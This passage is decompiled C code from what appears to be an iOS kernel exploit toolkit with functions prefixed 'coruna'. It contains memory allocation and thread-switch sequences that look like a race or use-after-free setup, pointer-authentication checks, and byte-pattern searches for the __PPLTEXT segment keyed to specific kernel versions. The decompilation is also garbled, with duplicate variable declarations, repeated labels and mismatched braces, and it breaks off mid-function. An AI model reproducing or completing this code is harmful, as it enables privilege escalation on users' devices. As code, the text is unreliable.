      if (*(unsigned long *)(&k_kernel_slot_19f0 + *(long *)(handle + 8)) <= scratch) {
        return;
      }
      bootargs = 0;
      err = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(handle,scratch + *(uint *)(handle + 0x264),&bootargs,1);
      if (err == 0) {
        if ((int)bootargs == flags) {
done:
          *(unsigned long *)(handle + 0x218) = scratch;
          return;
        }
        err = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(handle,scratch,&scratch,0);
        if (err == 0) goto joined_r0x0000dcd4;
      }
    }
    if (err != 0xad011) {
      return;
    }
fail:
    status = status + 1;
    scratch = arg;
    if (status == 3) {
      return;
    }
  } while( true );
}
void coruna_kernel5_residual_219(long handle)
{
  uint64_t scratch;
  uint64_t scratch;
  
  scratch = k_kernel_rodata_word_0003b318;
  scratch = k_kernel_rodata_word_3b310;
  scratch = (**(void (**)(**(long **)(handle + 8) + 8))
                       (*(long **)(handle + 8),k_kernel_rodata_word_400a0,2,&scratch);
  (**(void (**)(**(long **)(handle + 8) + 8))(*(long **)(handle + 8),k_kernel_rodata_word_400b0,1,&scratch);
  (**(void (**)(**(long **)(handle + 8) + 0x30))(*(long **)(handle + 8),0x12);
  (**(void (**)(**(long **)(handle + 8) + 0x30))(*(long **)(handle + 8),0x10);
  return;
}
void coruna_thread_switch(long handle)
{
  uint8_t *ptr;
  vm_address_t lv2;
  long handle;
  long addr;
  vm_address_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  scratch = 0;
  _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,0xc000,1);
  lv2 = scratch;
  handle = *(long *)(handle + 0x440);
  addr = *(long *)(handle + 0x5e0);
  *(uint8_t *)(*(long *)(handle + 0x5d8) + handle) = 0x41;
  *(uint8_t *)(addr + handle) = 0x41;
  handle = *(long *)(handle + *(long *)(handle + 0x478) * 8 + 0x468);
  _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0x38),0xc000);
  *(uint64_t *)(handle + 0x38) = 0;
  _thread_switch(0,2,0);
  handle = *(long *)(handle + 0x490 + *(long *)(handle + 0x4a0) * 8);
  _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0x38),0xc000);
  *(uint64_t *)(handle + 0x38) = 0;
  coruna_vm_remap_7d00(lv2,0xc000,0);
  coruna_vm_region_recurse_64(lv2);
  *(vm_address_t *)(*(long *)(handle + 0x490 + *(long *)(handle + 0x4a0) * 8) + 0x38) = lv2;
  coruna_vm_allocate_9cc0(handle,*(uint64_t *)(handle + 0x598));
  coruna_madvise(handle,*(long *)(handle + 0x598) + -4);
  handle = 0;
  do {
    coruna_vm_remap_7d00(*(uint64_t *)(*(long *)(handle + 0x30) + handle),0x4000,0);
    handle = handle + 8;
  } while (handle != 800000);
  return;
}
void coruna_kernel5_via_vm_map(long handle,unsigned long arg,long *addr_2)
{
  int err;
  long handle;
  unsigned long u;
  
  *addr_2 = 0;
  if (arg + 0x1000000000000 < 0xfffffffff000) {
    handle = *(long *)(handle + 0xd0);
    if ((handle == 0) || (*(long *)(handle + 0xd8) == 0)) {
      err = coruna_vm_map(handle);
      if (err != 0) {
        return;
      }
      handle = *(long *)(handle + 0xd0);
    }
    if (*(unsigned long *)(handle + 200) != 0) {
      u = 0;
      do {
        if ((*(int *)(handle + (unsigned long)((int)u + 0x20)) != 0) &&
           (*(unsigned long *)(handle + (unsigned long)((int)u + 0x18)) ==
            (arg & (*(unsigned long *)k_kernel_vm_page_mask_slot ^ 0xffffffffffffffff)))) {
          handle = *(long *)k_kernel_vm_page_size_slot;
          *addr_2 = (*(unsigned long *)k_kernel_vm_page_mask_slot & arg) +
                     ((((*(long *)(handle + 0xb8) + handle) - 1U & -handle) >>
                      ((unsigned long)*(uint *)k_kernel_vm_page_shift_slot & 0x3f)) + u / 0x30) * handle;
          return;
        }
        u = u + 0x30;
      } while ((u & 0xffffffff) < *(unsigned long *)(handle + 200));
    }
  }
  return;
}
void coruna_vm_map(long handle)
{
  kern_return_t lk1;
  int err;
  unsigned long size;
  vm_inherit_t in_stack_ffffffffffffffd0;
  vm_address_t scratch;
  
  scratch = 0;
  if ((*(long *)(handle + 0xd0) == 0) || (*(long *)(handle + 0xd8) == 0)) {
    err = (int)((unsigned long)(*(long *)(handle + 0xb8) - *(long *)(handle + 0xb0)) / 0x30);
    *(int *)(handle + 0xc0) = err;
    size = (unsigned long)(uint)(err * 0x30);
    *(unsigned long *)(handle + 200) = size;
    lk1 = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,size,0,1,
                    *(mem_entry_name_port_t *)(*(long *)(handle + 0x10) + 0x98),
                    (*(long *)(handle + 0xb0) - *(long *)(*(long *)(handle + 0x10) + 8)) +
                    *(long *)k_kernel_vm_page_size_slot * -2,0,1,1,in_stack_ffffffffffffffd0);
    if (lk1 == 0) {
      *(vm_address_t *)(handle + 0xd0) = scratch;
      *(unsigned long *)(handle + 0xd8) = size;
    }
  }
  return;
}





void coruna_kernel5_residual_220(uint64_t *val)
{
  uint8_t scratch[104];
  uint64_t bootargs;
  
  bootargs = *(uint64_t *)k_kernel_stack_chk_guard_slot;
  coruna_kernel5_via_helper_5d2c_32264(*val,val[2],val[7],0x20,scratch);
}
void coruna_kernel5_via_pacia_12_3(long handle,unsigned long arg,unsigned long arg)
{
  uint64_t u;
  int err;
  uint64_t size;
  long handle;
  unsigned long version;
  uint32_t scratch;
  uint8_t bootargs;
  uint32_t thread_attr;
  
  scratch = 0;
  handle = *(long *)(handle + 0x18);
  err = coruna_pacia_12(handle,0x400000);
  if (((err == 0) && (*(long *)(handle + 0x80) == 0)) &&
     (err = coruna_pacia_12(handle,0x5584241), err != 0)) {
    u = *(uint64_t *)(handle + 0x10);
    err = coruna_pacia_12(*(uint64_t *)(handle + 0x18),0x5584001);
    size = 0x2000007e4;
    if (err != 0) {
      size = 0x200000680;
    }
    coruna_kernel5_via_helper_5d2c_32264(u,size,&scratch,0);
  }
  if ((arg & 1) == 0) {
    err = coruna_pacia_12(handle,0x400000);
    if ((err == 0) && (err = coruna_pacia_12(handle,0x5584201), err != 0)) {
      return;
    }
    err = coruna_pacia_12(handle,0xa000);
    if (err != 0) {
      coruna_pacia_12(handle,0x8000);
      coruna_kernel5_via_helper_5d2c_32264(*(uint64_t *)(handle + 8),*(uint64_t *)(handle + 0x10),0x20ae00008,
                   &scratch,0);
    }
  }
  if (arg == 0) {
    err = coruna_pacia_12(*(uint64_t *)(handle + 0x18),0x40);
    if (err == 0) {
      return;
    }
    arg = *(unsigned long *)(handle + 0x38);
  }
  arg = arg & (*(unsigned long *)k_kernel_vm_kernel_page_mask_slot ^ 0xffffffffffffffff);
  err = coruna_pacia_12(handle,0x20);
  if (err == 0) {
    if (*(int *)(handle + 0x140) < 0x2258) {
      err = coruna_pacia_12(handle,0x400000);
      handle = 0x2000000;
      if (err != 0) {
        handle = 0x20000000;
      }
      version = handle + arg;
    }
    else {
      version = (*(long *)(handle + 0x80) + arg) - *(long *)(handle + 0x38);
    }
    thread_attr = 0;
    bootargs = 0;
    if (arg < version) {
      coruna_kernel5_via_helper_5d2c_32264(*(uint64_t *)(handle + 8),*(uint64_t *)(handle + 0x10),arg,&thread_attr,0)
      ;
    }
  }
  else {
    coruna_kernel5_residual_221(handle,arg,arg - 0x1000000,arg + 0x800000,
                 *(uint64_t *)k_kernel_vm_kernel_page_size_slot);
  }
  return;
}
void coruna_kernel5_residual_221(long handle,unsigned long arg,unsigned long arg)
{
  uint32_t scratch;
  
  scratch = 0;
  if (arg < arg) {
    return;
  }
  coruna_kernel5_via_helper_5d2c_32264(*(uint64_t *)(handle + 8),*(uint64_t *)(handle + 0x10),arg,&scratch,0);
}
void coruna_kernel5_residual_222(long handle,unsigned long arg,unsigned long arg,long *addr_2,long *off_3,long ctx_4)
{
  long handle;
  long addr;
  bool err;
  unsigned long u;
  unsigned long size;
  uint version;
  int err;
  uint port;
  unsigned long tag;
  uint kind;
  unsigned long type_id;
  
  *addr_2 = 0;
  *off_3 = 0;
  if (3 < arg) {
    version = 0;
    port = 0;
    size = 0;
    err = false;
    err = 8;
    do {
      if (err) {
        tag = size >> 1;
        if (*(int *)(ctx_4 + 0x140) < 0x225c) {
          type_id = *(unsigned long *)(handle + tag * 8);
          tag = size + 2 >> 1;
          u = size + 4 >> 1;
        }
        else {
          type_id = (unsigned long)*(ushort *)(handle + tag * 8 + 0x18);
          u = tag + 2;
        }
        if (type_id == 0x18) {
          size = *(unsigned long *)(handle + u * 8);
          handle = 0;
          if (size <= arg) {
            handle = arg - size;
          }
          addr = *(long *)(handle + tag * 8) - handle;
          if (addr == 0) {
            return;
          }
          *addr_2 = addr;
          *off_3 = handle + size;
          return;
        }
        kind = port + 1;
        if (version <= kind) {
          if (err == 6) {
            return;
          }
          kind = 0;
          size = size - (long)(int)(err * port + -1);
          err = 6;
        }
        size = size + (err - 1);
        err = true;
        port = kind;
      }
      else if (*(int *)(handle + size * 4) == 0x686f6d6d) {
        version = *(uint *)(handle + size * 4 + 0xc);
        size = size + 5;
        err = true;
      }
      else {
        err = false;
      }
      size = size + 1;
    } while (size < arg >> 2);
  }
  return;
}
void coruna_kernel5_via_call_return_zero_61a8_165ac(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t *off_4,
                 uint64_t off_5,uint64_t off_6)
{
  int err;
  uint64_t u;
  uint32_t scratch[22];
  uint64_t bootargs;
  uint64_t scratch;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  scratch[0] = 0;
  bootargs = 0;
  scratch = 0;
  off_4[1] = 0;
  *off_4 = 0;
  off_4[3] = 0;
  off_4[2] = 0;
  off_4[5] = 0;
  off_4[4] = 0;
  off_4[7] = 0;
  off_4[6] = 0;
  off_4[9] = 0;
  off_4[8] = 0;
  off_4[0xb] = 0;
  off_4[10] = 0;
  off_4[0xd] = 0;
  off_4[0xc] = 0;
  off_4[0xf] = 0;
  off_4[0xe] = 0;
  off_4[0x11] = 0;
  off_4[0x10] = 0;
  off_4[0x13] = 0;
  off_4[0x12] = 0;
  off_4[0x15] = 0;
  off_4[0x14] = 0;
  off_4[0x17] = 0;
  off_4[0x16] = 0;
  off_4[0x19] = 0;
  off_4[0x18] = 0;
  off_4[0x1b] = 0;
  off_4[0x1a] = 0;
  *off_4 = val;
  off_4[1] = id_2;
  off_4[2] = size_3;
  off_4[3] = off_5;
  u = k_kernel_rodata_word_33990;
  off_4[6] = k_kernel_rodata_word_00033998;
  off_4[5] = u;
  off_4[4] = off_6;
  u = coruna_call_return_zero_61a8_165ac();
  off_4[0xe] = u;
  err = coruna_kernel5_via_pacia_12_3(off_4,0,0);
  if (err == 0) {
    coruna_ret_stub_5();
    err = coruna_pacia_12(off_4[3],0x5184001);
    coruna_kernel5_via_helper_5d2c_32264(size_3,*(uint64_t *)(off_4[4] + (unsigned long)(err != 0) * 8),scratch,0);
  }
  off_4[0x19] = 0;
  off_4[0x18] = 0;
  off_4[0x1b] = 0;
  off_4[0x1a] = 0;
  off_4[0x15] = 0;
  off_4[0x14] = 0;
  off_4[0x17] = 0;
  off_4[0x16] = 0;
  off_4[0x11] = 0;
  off_4[0x10] = 0;
  off_4[0x13] = 0;
  off_4[0x12] = 0;
  off_4[0xd] = 0;
  off_4[0xc] = 0;
  off_4[0xf] = 0;
  off_4[0xe] = 0;
  off_4[9] = 0;
  off_4[8] = 0;
  off_4[0xb] = 0;
  off_4[10] = 0;
  off_4[5] = 0;
  off_4[4] = 0;
  off_4[7] = 0;
  off_4[6] = 0;
  off_4[1] = 0;
  *off_4 = 0;
  off_4[3] = 0;
  off_4[2] = 0;
  scratch[0] = 0;
  if (*(long *)k_kernel_stack_chk_guard_slot != thread_attr) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_vm_deallocate(long handle)
{
  vm_address_t address;
  
  address = *(vm_address_t *)(handle + 0xd0);
  if ((address != 0) && (*(vm_size_t *)(handle + 0xd8) != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,*(vm_size_t *)(handle + 0xd8)
                  );
    *(vm_address_t *)(handle + 0xd0) = 0;
    *(uint64_t *)(handle + 0xd8) = 0;
  }
  return;
}
void coruna_vm_deallocate_fb08(uint64_t *val)
{
  if ((val[0x1a] != 0) && (val[0x1b] != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,val[0x1a],val[0x1b]);
  }
  val[0x19] = 0;
  val[0x18] = 0;
  val[0x1b] = 0;
  val[0x1a] = 0;
  val[0x15] = 0;
  val[0x14] = 0;
  val[0x17] = 0;
  val[0x16] = 0;
  val[0x11] = 0;
  val[0x10] = 0;
  val[0x13] = 0;
  val[0x12] = 0;
  val[0xd] = 0;
  val[0xc] = 0;
  val[0xf] = 0;
  val[0xe] = 0;
  val[9] = 0;
  val[8] = 0;
  val[0xb] = 0;
  val[10] = 0;
  val[5] = 0;
  val[4] = 0;
  val[7] = 0;
  val[6] = 0;
  val[1] = 0;
  *val = 0;
  val[3] = 0;
  val[2] = 0;
  return;
}
void coruna_kernel5_residual_223(uint64_t *val,long handle,unsigned long arg,uint8_t *buf)
{
  uint8_t scratch[32];
  
  *buf = 0;
  if ((arg != 0) && (arg < handle + 0x20U)) {
    return;
  }
  coruna_kernel5_via_helper_5d2c_32264(*val,val[2],handle,0x20,scratch);
}
void coruna_kernel5_residual_224(uint64_t *val,unsigned long arg,unsigned long arg)
{
  int err;
  uint u;
  uint size;
  long handle;
  unsigned long version;
  uint8_t scratch[32];
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = k_kernel_rodata_word_000336b8;
  bootargs = k_kernel_rodata_word_336b0;
  thread_attr = k_kernel_rodata_word_000336a8;
  bootargs = k_kernel_rodata_word_336a0;
  handle = val[3];
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err == 0x1c1b) {
      size = 0x118;
    }
    else if (err == 0x1f53) {
      size = 0x128;
    }
    else {
      {
        if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
        return;
        }
        ___stack_chk_fail();
      }
      size = 0xa0;
    }
  }
  else if (err == 0x2258 || err == 0x225c) {
    size = 0xc0;
  }
  else {
    {
      if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
      return;
      }
      ___stack_chk_fail();
    }
    size = 0xd0;
  }
  if (*(unsigned long *)(handle + 0x158) >> 0x2b < 1099) {
    version = 0;
  }
  else {
    u = 0;
    if (size != 0) {
      u = *(uint *)(handle + 0x180) / size;
    }
    version = (unsigned long)(*(uint *)(handle + 0x180) - u * size);
  }
  if (arg <= arg) {
    coruna_kernel5_via_helper_5d2c_32264(*val,val[2],version + arg,0x20,scratch);
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail();
}
void coruna_kernel5_via_pacia(uint64_t val,long *handle,long *addr_2)
{
  long handle;
  
  if ((*addr_2 == *handle && addr_2[1] == handle[1]) &&
     (handle = coruna_pacia(val,addr_2[2]), handle != 0)) {
    coruna_pacia(val,addr_2[3]);
  }
  return;
}
void coruna_bzero_3(uint64_t *val,uint64_t id_2,unsigned long arg,uint64_t size_3,
                 unsigned long arg,uint64_t *off_4)
{
  void *ptr;
  unsigned long u;
  
  u = *(unsigned long *)k_kernel_vm_page_size_slot;
  *off_4 = 0;
  if ((arg <= u) && (ptr = _malloc(u), ptr != (void *)0x0)) {
    if (arg != 0) {
      if (arg <= u) {
        u = arg;
      }
      coruna_kernel5_via_helper_5d2c_32264(*val,val[2],id_2,u,ptr);
    }
    _bzero(ptr,u);
    _free(ptr);
  }
  return;
}
void coruna_cfdictionaryapplyfunction(long handle,long addr_2)
{
  long handle;
  long addr;
  uint64_t u;
  uint32_t scratch[2];
  long bootargs;
  
  if (handle != 0) {
    handle = _CFGetTypeID();
    addr = _CFDictionaryGetTypeID();
    if ((handle == addr) && (addr_2 != 0)) {
      handle = _CFGetTypeID(addr_2);
      addr = _CFDictionaryGetTypeID();
      if (handle == addr) {
        scratch[0] = 0;
        bootargs = handle;
        u = coruna_kernel5_via_pacia_16(coruna_cfdictionarygetvalueifpresent);
        _CFDictionaryApplyFunction(addr_2,u,scratch);
      }
    }
  }
  return;
}
void coruna_cfdictionarygetvalueifpresent(long handle,long addr_2,int *flags)
{
  int err;
  long handle;
  long addr;
  long off;
  uint64_t u;
  uint64_t size;
  long scratch;
  int bootargs [2];
  long thread_attr;
  
  if (flags == (int *)0x0) {
    return;
  }
  if (*flags != 0) {
    return;
  }
  if ((handle == 0) || (addr_2 == 0)) {
    err = 0xad001;
  }
  else {
    handle = _CFGetTypeID(addr_2);
    addr = _CFStringGetTypeID();
    if ((((addr == handle) || (addr = _CFArrayGetTypeID(), addr == handle)) ||
        (addr = _CFBooleanGetTypeID(), addr == handle)) ||
       (addr = _CFNumberGetTypeID(), addr == handle)) {
      scratch = 0;
      err = _CFDictionaryGetValueIfPresent(*(uint64_t *)(flags + 2),handle,&scratch);
      if (err == 0) {
fail:
        if (*flags != 0) {
          return;
        }
        _CFDictionarySetValue(*(uint64_t *)(flags + 2),handle,addr_2);
        return;
      }
      handle = _CFGetTypeID(scratch);
      addr = _CFGetTypeID(addr_2);
      if (addr == handle) {
        off = _CFArrayGetTypeID();
        addr = scratch;
        if (off == handle) {
          err = 0xad001;
          if (scratch != 0) {
            handle = _CFGetTypeID(scratch);
            off = _CFArrayGetTypeID();
            if (handle == off) {
              handle = _CFGetTypeID(addr_2);
              off = _CFArrayGetTypeID();
              if (handle == off) {
                handle = _CFGetTypeID(addr_2);
                off = _CFArrayGetTypeID();
                err = 0xad001;
                if (handle == off) {
                  bootargs[0] = coruna_cat(bootargs[0],1);
                  u = _CFArrayGetCount(addr_2);
                  size = coruna_kernel5_via_helper_5d2c_419fc(coruna_cfstringgettypeid);
                  _CFArrayApplyFunction(addr_2,0,u,size,bootargs);
                  if ((char)bootargs[0] == '\0') {
                    err = 0xad014;
                  }
                  else {
                    bootargs[0] = 0;
                    thread_attr = addr;
                    u = _CFArrayGetCount(addr_2);
                    size = coruna_kernel5_via_helper_5d2c_419fc(coruna_cfarraycontainsvalue);
                    _CFArrayApplyFunction(addr_2,0,u,size,bootargs);
                    err = bootargs[0];
                  }
                }
              }
            }
          }
          *flags = err;
          return;
        }
        if (*flags != 0) {
        return;
        }
        _CFDictionarySetValue(*(uint64_t *)(flags + 2),handle,addr_2);
        return;
      }
    }
    err = 0xad014;
  }
  *flags = err;
  return;
}
void coruna_cfdictionaryapplyfunction_1042c(long handle,long addr_2)
{
  long handle;
  long addr;
  uint64_t u;
  uint32_t scratch[2];
  long bootargs;
  
  if (handle != 0) {
    handle = _CFGetTypeID();
    addr = _CFDictionaryGetTypeID();
    if ((handle == addr) && (addr_2 != 0)) {
      handle = _CFGetTypeID(addr_2);
      addr = _CFDictionaryGetTypeID();
      if (handle == addr) {
        scratch[0] = 0;
        bootargs = handle;
        u = coruna_kernel5_via_pacia_16(coruna_cfdictionarygetvalueifpresent_104e8);
        _CFDictionaryApplyFunction(addr_2,u,scratch);
      }
    }
  }
  return;
}
void coruna_cfdictionarygetvalueifpresent_104e8(long handle,long addr_2,int *flags)
{
  int err;
  long handle;
  long addr;
  uint64_t u;
  uint64_t size;
  int scratch [2];
  uint64_t bootargs;
  uint64_t thread_attr;
  
  if (flags == (int *)0x0) {
    return;
  }
  if (*flags != 0) {
    return;
  }
  if ((handle == 0) || (addr_2 == 0)) {
    scratch[0] = 0xad001;
  }
  else {
    thread_attr = 0;
    err = _CFDictionaryGetValueIfPresent(*(uint64_t *)(flags + 2),handle,&thread_attr);
    if (err == 0) {
      scratch[0] = 0xad011;
    }
    else {
      handle = _CFGetTypeID(thread_attr);
      addr = _CFGetTypeID(addr_2);
      if (addr == handle) {
        addr = _CFArrayGetTypeID();
        if (addr == handle) {
          scratch[0] = 0;
          bootargs = thread_attr;
          u = _CFArrayGetCount(addr_2);
          size = coruna_kernel5_via_helper_5d2c_419fc(coruna_cfarraycontainsvalue_10718);
          _CFArrayApplyFunction(addr_2,0,u,size,scratch);
          *flags = scratch[0];
          return;
        }
        err = _CFEqual(addr_2,thread_attr);
        if (err != 0) {
          *flags = 0;
          return;
        }
      }
      scratch[0] = 0xad014;
    }
  }
fail:
  *flags = scratch[0];
  return;
}
void coruna_cfarraycontainsvalue(long handle,int *flags)
{
  int err;
  uint64_t u;
  uint64_t size;
  
  if ((flags != (int *)0x0) && (*flags == 0)) {
    if (handle == 0) {
      *flags = 0xad001;
    }
    else {
      size = *(uint64_t *)(flags + 2);
      u = _CFArrayGetCount(size);
      err = _CFArrayContainsValue(size,0,u,handle);
      if (err == 0) {
        _CFArrayAppendValue(*(uint64_t *)(flags + 2),handle);
      }
    }
  }
  return;
}
void coruna_cfstringgettypeid(long handle,uint8_t *buf)
{
  long handle;
  long addr;
  
  if (buf != (uint8_t *)0x0) {
    if (handle != 0) {
      handle = _CFGetTypeID();
      addr = _CFStringGetTypeID();
      if (handle == addr) {
        return;
      }
    }
    *buf = 0;
  }
  return;
}
void coruna_cfarraycontainsvalue_10718(long handle,int *flags)
{
  int err;
  uint64_t u;
  uint64_t size;
  
  if ((flags != (int *)0x0) && (*flags == 0)) {
    err = 0xad001;
    if (handle != 0) {
      size = *(uint64_t *)(flags + 2);
      u = _CFArrayGetCount(size);
      err = _CFArrayContainsValue(size,0,u,handle);
      if (err != 0) {
        return;
      }
      err = 0xad011;
    }
    *flags = err;
  }
  return;
}
void coruna_kernel5_via_pacia_12_4(long handle)
{
  int err;
  
  err = coruna_pacia_12(handle,0x5184000);
  if (((err == 0) ||
      ((*(unsigned long *)(handle + 0x158) < 0x2712000c700000 &&
       ((*(unsigned long *)(handle + 0x158) < 0x225c2380100000 || (0x2711 < *(int *)(handle + 0x140)))))))
     && ((err = coruna_pacia_12(handle,0x5100000), err == 0 ||
         ((*(unsigned long *)(handle + 0x158) < 0x27120007400000 &&
          ((*(unsigned long *)(handle + 0x158) < 0x225c1e80500000 || (0x2711 < *(int *)(handle + 0x140))))
          ))))) {
    coruna_pacia_3(handle);
  }
  return;
}
void coruna_pacia_12_stub_2(uint64_t val)
{
  coruna_pacia_12(val,0x5184001);
  return;
}
void coruna_kernel5_via_bzero_4(long handle,unsigned long arg,long addr_2,unsigned long arg)
{
  unsigned long u;
  uint size;
  unsigned long version;
  int err;
  unsigned long port;
  unsigned long tag;
  long handle;
  unsigned long kind;
  unsigned long type_id;
  unsigned long type_id_8;
  unsigned long scratch;
  uint64_t bootargs;
  unsigned long thread_attr;
  long host_info;
  
  thread_attr = 0;
  host_info = 0;
  scratch = 0;
  bootargs = 0;
  err = coruna_pacia_12(handle,0x5184001);
  if ((((err != 0) && (arg != 0)) && (addr_2 != 0)) && ((int)arg != 0)) {
    if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
      err = coruna_find_ppltext(handle,&thread_attr,(long)&bootargs + 4);
      version = thread_attr;
      if ((err != 0) && (thread_attr <= arg)) {
        u = arg + (arg & 0xffffffff);
        size = bootargs;
        type_id = (unsigned long)bootargs;
        if ((u <= thread_attr + type_id) && (err = coruna_kernel5_via_kernel5_via_vm_deallocate_2a1cc(handle,3,&host_info), err != 0))
        {
          if (host_info == 0) {
            kind = type_id + 8;
            if (size < 0x8c001 && *(long *)(handle + 0x158) + 0xffe7f6f5f8700000U < 0xf78900000) {
              kind = 0x8c008;
            }
            tag = (unsigned long)*(uint *)(handle + 0x180);
            port = 0;
            if (tag != 0) {
              port = kind / tag;
            }
            handle = kind - port * tag;
            err = 0;
            if (handle != 0) {
              err = *(uint *)(handle + 0x180) - (int)handle;
            }
            bootargs = coruna_u64_pack((bootargs), (int)kind + err);
            host_info = coruna_vm_deallocate_2a1cc(handle,&bootargs);
            if (host_info == 0) {
              return;
            }
            err = coruna_kernel5_via_kernel5_via_vm_deallocate_2a1cc_2(handle,3,host_info);
            if (err == 0) {
              return;
            }
          }
          port = *(unsigned long *)(handle + 0x188);
          for (kind = arg & (port ^ 0xffffffffffffffff);
              kind <= (u - 1 & (port ^ 0xffffffffffffffff));
              kind = kind + *(uint *)(handle + 0x180)) {
            err = coruna_ret_stub_6(handle,host_info + type_id,8,&scratch);
            if (err == 0) {
              return;
            }
            tag = kind - version;
            type_id_8 = (unsigned long)(1 << (unsigned long)((uint)(tag >> 0xe) & 0x1f));
            if ((scratch & type_id_8) == 0) {
              err = coruna_kernel5_via_semaphore_timedwait(handle,host_info + tag,kind);
              if (err == 0) {
                return;
              }
              scratch = scratch | type_id_8;
              err = coruna_ret_stub_7(handle,host_info + type_id,&scratch,8);
              if (err == 0) {
                return;
              }
            }
          }
          coruna_ret_stub_7(handle,(arg - version) + host_info,addr_2,arg);
        }
      }
    }
    else {
      coruna_bzero_4(handle,arg,addr_2,arg,0);
    }
  }
  return;
}
void coruna_bzero_4(long handle,unsigned long arg,uint64_t val,unsigned long arg,uint64_t id_2)
{
  int err;
  uint u;
  unsigned long *ptr;
  unsigned long size;
  unsigned long version;
  long handle;
  long addr;
  unsigned long port;
  uint scratch;
  long bootargs;
  
  err = coruna_mach_absolute_time_1a9c0(handle,5,&k_kernel_slot_2710);
  if (err != 0) {
    return;
  }
  bootargs = 0;
  version = arg & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff);
  if (version == ((arg + (arg & 0xffffffff)) - 1 &
               (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff))) {
    u = 0x100;
    if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
      u = 0x10;
    }
    port = (unsigned long)u;
    ptr = (unsigned long *)(handle + 0x878);
    size = port;
    do {
      if (*ptr == 0) break;
      if ((version == *ptr) && (ptr[-1] != 0)) {
        handle = (arg - version) + ptr[-1];
        {
          err = coruna_kernel5_via_call_mach_vm_machine_attribute_1d4f8(handle,handle,val,arg,id_2);
          if (err != 0) {
          coruna_kernel5_residual_251(handle,5);
          return;
          }
        }
      }
      ptr = ptr + 2;
      size = size - 1;
    } while (size != 0);
    err = coruna_kernel5_via_kernel5_via_vm_deallocate_2a1cc(handle,7,&bootargs);
    if (err != 0) {
      if (bootargs == 0) {
        scratch = u << 4;
        size = (unsigned long)scratch;
        bootargs = coruna_vm_deallocate_2a1cc(handle,&scratch);
        if ((bootargs == 0) || (err = coruna_kernel5_via_kernel5_via_vm_deallocate_2a1cc_2(handle,7,bootargs), err == 0))
        {
          coruna_kernel5_residual_251(handle,5);
          return;
        }
        _bzero((void *)(handle + 0x870),size);
      }
      else {
        err = coruna_ret_stub_6(handle,bootargs,u << 4,(void *)(handle + 0x870));
        {
          coruna_kernel5_residual_251(handle,5);
          return;
        }
      }
      addr = 0x870;
      do {
        size = *(unsigned long *)(handle + addr + 8);
        if (size == 0) {
          scratch = *(uint *)(handle + 0x180);
          handle = coruna_mach_port_request_notification_29a50(handle,&scratch);
          if (((handle != 0) && (scratch == *(uint *)(handle + 0x180))) &&
             (err = coruna_kernel5_via_semaphore_timedwait(handle,handle,version), err != 0)) {
            *(unsigned long *)(handle + addr + 8) = version;
            *(long *)(handle + addr) = handle;
            err = coruna_ret_stub_7(handle,bootargs + (addr - 0x870U & 0xffffffff0),
                                 (long *)(handle + addr),0x10);
            if (err != 0) {
cleanup:
              handle = (arg - version) + handle;
fail:
              err = coruna_kernel5_via_call_mach_vm_machine_attribute_1d4f8(handle,handle,val,arg,id_2);
              if (err != 0) {
                coruna_kernel5_residual_251(handle,5);
                return;
              }
            }
          }
          break;
        }
        if ((version == size) && (handle = *(long *)(handle + addr), handle != 0)) goto cleanup;
        addr = addr + 0x10;
        port = port - 1;
      } while (port != 0);
    }
  }
done:
  coruna_kernel5_residual_251(handle,5);
  return;
}
void coruna_find_ppltext(long handle,long *addr_2,int *flags)
{
  bool err;
  long handle;
  int err;
  int status;
  unsigned long u;
  long addr;
  char *ptr;
  uint64_t scratch;
  long bootargs;
  unsigned long thread_attr;
  uint64_t host_info;
  long serial_buf;
  unsigned long action;
  
  addr = *(long *)(&k_kernel_slot_1888 + handle);
  if (addr != 0) {
    err = *(int *)(&k_kernel_slot_1890 + handle);
    *addr_2 = addr;
    *flags = err;
    return;
  }
  err = *(int *)(*(long *)(&k_kernel_slot_19f8 + handle) + 0x70);
  if (err < 0x2258) {
    ptr = "1F 01 13 EB 20 91 53 FA .. .. 00 54 68 02";
    }
    check_ok:
    coruna_macho_find_loadcmd(&host_info,*(long *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
    if ((0x180919801fffff < *(unsigned long *)(handle + 0x158)) && (*(int *)(handle + 0x140) < 0x1c1b)) {
    if (serial_buf == 0) {
    return;
    }
    u = (unsigned long)*(uint *)(handle + 0x180);
    err = action < u;
    action = action - u;
    if (err || action == 0) {
    return;
    }
    serial_buf = serial_buf + u;
    }
    bootargs = serial_buf;
    scratch = host_info;
    thread_attr = action;
    handle = coruna_strsep(&scratch,ptr,0,1);
    if (handle == 0) {
    return;
      }
      check_ok:
      coruna_macho_find_loadcmd(&host_info,*(long *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
      if ((0x180919801fffff < *(unsigned long *)(handle + 0x158)) && (*(int *)(handle + 0x140) < 0x1c1b)) {
      if (serial_buf == 0) {
      return;
    }
    ptr = "1F 01 .. EB 20 91 .. FA .. .. 00 54";
  }
  else {
    if (err != 0x2258 && err != 0x225c) {
      status = 0x2712;
cleanup:
      if (err != status) {
        ptr = (char *)0x0;
